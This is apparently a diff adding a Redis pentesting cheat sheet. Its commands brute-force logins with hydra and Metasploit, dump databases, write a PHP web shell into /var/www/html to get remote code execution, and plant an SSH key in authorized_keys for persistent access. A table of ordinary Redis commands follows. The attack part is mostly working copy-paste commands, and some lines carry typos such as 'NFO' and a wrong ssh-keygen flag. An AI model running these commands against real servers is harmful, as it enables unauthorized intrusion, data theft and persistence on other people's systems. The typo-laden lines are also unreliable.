@@ -1,0 +1,101 @@
+##
+## Extra Tips -> https://hacktricks.boitatech.com.br/pentesting/6379-pentesting-redis
+
+## nmap ##
+nmap --script redis-info -sV -p 6379 <IP>
+
+## Brute Force Redis Service on port 6379 ##
+hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://X.X.X.X
+hydra -l redis -P <path to wordlist> <target IP> redis
+
+## Connect to Redis Service on port 6379 ##
+redis-cli -h 192.168.208.69 -p 6379  #Connect with no username or password
+redis-cli -h 192.168.0.0 -p 6379 --user admin --pass password #Connect with username and password
+
+
+## Use Metasploit Modules ##
+use auxiliary/scanner/redis/redis_server
+msf auxiliary(scanner/redis/redis_server) > set rhosts X.X.X.X
+msf auxiliary(scanner/redis/redis_server) > exploit
+
+use auxiliary/scanner/redis/redis_login
+msf auxiliary(scanner/redis/redis_login) > set rhosts X.X.X.X
+msf auxiliary(scanner/redis/redis_login) > set user_file /path/to/user.txt
+msf auxiliary(scanner/redis/redis_login) > set pass_file /path/to/pass.txt
+msf auxiliary(scanner/redis/redis_login) > set stop_on_success true
+msf auxiliary(scanner/redis/redis_login) > exploit
+
+## Authenticated enumeration ##
+NFO
+[ ... Redis response with info ... ]
+client list
+[ ... Redis response with connected clients ... ]
+CONFIG GET *
+[ ... Get config ... ]
+
+## Dumping Database - ##
+## Database(s) should show under keyspace after running info command. database numbers start at 0 which is the default, in example 1 is used.
+SELECT 1
+[ ... Indicate the database ... ]
+KEYS * 
+[ ... Get Keys ... ]
+GET <KEY>
+[ ... Get Key ... ]
+
+## Exploiting Redis for Remote Code Execution - V1 ##
+redis-cli -h 192.18.0.0
+config set dir /var/www/html
+config set dbfilename redis.php
+set test "<?php phpinfo(); ?>"
+save
+
+## Exploiting Redis for Remote Code Execution - V2##
+redis-cli -h X.X.X.X flushall
+redis-cli -h X.X.X.X set pwn '<?php system($_REQUEST['cmd']); ?>'
+redis-cli -h X.X.X.X config set dbfilename shell.php
+redis-cli -h X.X.X.X config set dir /var/www/html
+redis-cli -h X.X.X.X save
+
+## Unauthorized SSH Access via Redis Exploitation - uses Redis to insert SSH public key into the authorized_keys file of a Redis server ##
+$ ssh-keygen -t ecdsa -s 521 -f key
+$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+$ redis-cli -h X.X.X.X flushall
+$ cat foo.txt | redis-cli -h X.X.X.X -x set pwn
+$ redis-cli -h X.X.X.X config set dbfilename authorized_keys
+$ redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
+$ redis-cli -h X.X.X.X save
+ssh -i id_rsa redis@IP    ##Try to login with shh key as redis user
+
+
+
+
+
+
+
+## Common Redis Commands ##
+Command	  Description	                            Usage
+SET	      Sets the value of a key	                SET key value
+GET	      Gets the value of a key	                GET key
+DEL	      Deletes one or more keys	              DEL key1 [key2 ...]
+KEYS	    Lists all keys matching a pattern	      KEYS pattern
+EXPIRE	  Sets an expiration time on a key	      EXPIRE key seconds
+TTL	      Gets the remaining TTL of a key	        TTL key
+INCR	    Increments the value of a key	          INCR key
+DECR	    Decrements the value of a key	          DECR key
+LPUSH	    Prepends one or many values to a list	  LPUSH key value [value ...]
+RPUSH	    Appends one or many values to a list	  RPUSH key value [value ...]
+LPOP	    Removes and gets the first element in a list	    LPOP key
+RPOP	    Removes and gets the last element in a list	      RPOP key
+SADD	    Adds one or more members to a set	      SADD key member [member ...]
+SMEMBERS	Gets all members in a set	              SMEMBERS key
+ZADD	    Adds one or more members to a sorted set	    ZADD key score member [score member ...]
+ZRANGE	  Returns a range of members in a sorted set	  ZRANGE key start stop [WITHSCORES]
+HSET	    Sets field in the hash stored at key	        HSET key field value [field value ...]
+HGET	    Gets the value of a field in a hash stored at key	        HGET key field
+HDEL	    Deletes one or more fields from a hash stored at key	HDEL key field [field ...]
+HMSET	    Sets multiple fields in a hash stored at key (Use HSET for Redis 4.0.0 and above)	      HMSET key field1 value1 [field2 value2 ...]
+
+
+
+
+
